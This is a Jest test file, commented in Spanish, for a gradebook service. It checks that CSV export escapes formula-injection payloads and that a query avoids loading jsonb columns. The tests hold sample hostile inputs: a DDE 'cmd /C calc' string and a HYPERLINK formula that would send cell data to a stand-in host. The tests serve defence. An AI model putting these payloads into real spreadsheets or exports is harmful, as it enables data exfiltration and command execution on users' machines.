import { ProjectGradebookService } from './project-gradebook.service';

/**
 * MED-07: `escapeCsv` es un helper puro y privado. Se ejercita directamente
 * porque el resto del servicio exige cuatro repositorios y el servicio de
 * acceso, y ninguno interviene en la neutralización de fórmulas.
 */
describe('ProjectGradebookService — MED-07: neutralización de fórmulas en CSV', () => {
  const service = new ProjectGradebookService(
    {} as any,
    {} as any,
    {} as any,
    {} as any,
    {} as any,
  );

  const escapeCsv = (value: string | number): string =>
    (
      service as unknown as { escapeCsv: (v: string | number) => string }
    ).escapeCsv(value);

  it.each(['=', '+', '-', '@', '\t', '\r'])(
    'antepone un apóstrofo a un valor que empieza por %j',
    (prefix) => {
      const result = escapeCsv(`${prefix}cmd|'/C calc'!A0`);
      expect(result.startsWith(`"'${prefix}`)).toBe(true);
    },
  );

  it('neutraliza una fórmula de exfiltración en notas del docente', () => {
    const result = escapeCsv('=HYPERLINK("http://evil.test?d="&A1,"click")');
    expect(result).toBe(`"'=HYPERLINK(""http://evil.test?d=""&A1,""click"")"`);
    expect(result.startsWith('"=')).toBe(false);
  });

  it('no altera texto que no dispara evaluación de fórmula', () => {
    expect(escapeCsv('Buen trabajo')).toBe('"Buen trabajo"');
    expect(escapeCsv('Nota: 7,5 sobre 10')).toBe('"Nota: 7,5 sobre 10"');
  });

  it('sigue escapando las comillas dobles', () => {
    expect(escapeCsv('dijo "hola"')).toBe('"dijo ""hola"""');
  });

  it('no antepone apóstrofo a valores numéricos positivos', () => {
    expect(escapeCsv(7.5)).toBe('"7.5"');
  });

  it('neutraliza un número negativo, que la hoja también evalúa', () => {
    // No es un falso positivo aceptable a la ligera: una celda "-1" se muestra
    // como "'-1". Se prefiere el falso positivo a dejar viva la vía de
    // inyección, y las columnas numéricas del export no emiten negativos.
    expect(escapeCsv(-1)).toBe(`"'-1"`);
  });
});

describe('ProjectGradebookService — ESC-CRIT-05: el gradebook no carga columnas jsonb', () => {
  function buildService() {
    const qb: Record<string, jest.Mock> = {};
    Object.assign(qb, {
      select: jest.fn(() => qb),
      addSelect: jest.fn(() => qb),
      distinctOn: jest.fn(() => qb),
      innerJoin: jest.fn(() => qb),
      where: jest.fn(() => qb),
      andWhere: jest.fn(() => qb),
      orderBy: jest.fn(() => qb),
      addOrderBy: jest.fn(() => qb),
      getRawMany: jest.fn(() =>
        Promise.resolve([
          { deliveryId: 'delivery-1', overallOutcome: 'PASS' },
          { deliveryId: 'delivery-2', overallOutcome: null },
        ]),
      ),
    });

    const buildRuns = {
      createQueryBuilder: jest.fn(() => qb),
      // Si el servicio volviera a `find()`, cargaría la entidad completa: el
      // doble lo hace fallar de forma explícita en vez de pasar en silencio.
      find: jest.fn(() => {
        throw new Error('find() carga las columnas jsonb completas');
      }),
    };

    const service = new ProjectGradebookService(
      {
        findOne: jest.fn(() =>
          Promise.resolve({ id: 'p-1', maxDeliveriesPerStudent: 3 }),
        ),
      } as never,
      {
        find: jest.fn(() =>
          Promise.resolve([
            {
              id: 'assignment-1',
              studentId: 'student-1',
              assignedAt: new Date('2026-01-01T00:00:00Z'),
              student: {
                firstName: 'Ana',
                lastName: 'García',
                email: 'ana@test',
              },
              project: { maxDeliveriesPerStudent: 3 },
            },
          ]),
        ),
      } as never,
      {
        find: jest.fn(() =>
          Promise.resolve([
            {
              id: 'delivery-1',
              assignmentId: 'assignment-1',
              status: 'EVALUATED',
              grade: 7.5,
              graderNotes: null,
              isLate: false,
              createdAt: new Date('2026-01-02T00:00:00Z'),
            },
          ]),
        ),
      } as never,
      buildRuns as never,
      { assertCanManageProject: jest.fn(() => Promise.resolve()) } as never,
    );

    return { service, buildRuns, qb };
  }

  it('extrae overallOutcome en SQL en lugar de cargar la entidad', async () => {
    const { service, buildRuns, qb } = buildService();

    await service.getGradebook('p-1', { userId: 'u-1' } as never);

    expect(buildRuns.find).not.toHaveBeenCalled();
    expect(buildRuns.createQueryBuilder).toHaveBeenCalled();
    expect(qb.addSelect).toHaveBeenCalledWith(
      expect.stringContaining('overallOutcome'),
      'overallOutcome',
    );
  });

  it('delega en DISTINCT ON la selección de la última ejecución por entrega', async () => {
    const { service, qb } = buildService();

    await service.getGradebook('p-1', { userId: 'u-1' } as never);

    // Antes se traían TODAS las ejecuciones y se filtraba en memoria.
    expect(qb.distinctOn).toHaveBeenCalledWith(['run.deliveryId']);
    expect(qb.addOrderBy).toHaveBeenCalledWith('run.createdAt', 'DESC');
  });

  it('filtra por proyecto y no por una lista de identificadores de entrega', async () => {
    const { service, qb } = buildService();

    await service.getGradebook('p-1', { userId: 'u-1' } as never);

    // Un `IN` con los ids de todas las entregas crece con el tamaño del curso.
    expect(qb.where).toHaveBeenCalledWith(
      expect.stringContaining('projectId'),
      expect.objectContaining({ projectId: 'p-1' }),
    );
  });

  it('mapea el veredicto extraído al resultado', async () => {
    const { service } = buildService();

    const rows = await service.getGradebook('p-1', { userId: 'u-1' } as never);

    expect(rows).toHaveLength(1);
    expect(rows[0].latestBuilderOutcome).toBe('PASS');
    expect(rows[0].grade).toBe(7.5);
  });
});
